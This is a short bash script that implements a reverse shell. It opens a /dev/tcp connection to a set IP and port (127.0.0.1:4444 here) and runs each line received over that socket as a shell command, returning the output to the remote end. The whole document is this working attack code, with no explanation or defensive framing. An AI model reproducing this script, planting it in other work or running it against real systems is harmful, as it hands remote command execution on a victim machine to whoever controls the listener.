ip="127.0.0.1"
port=4444

exec 5<>/dev/tcp/$ip/$port
cat <&5 | while read line; do $line 2>&5 >&5; done
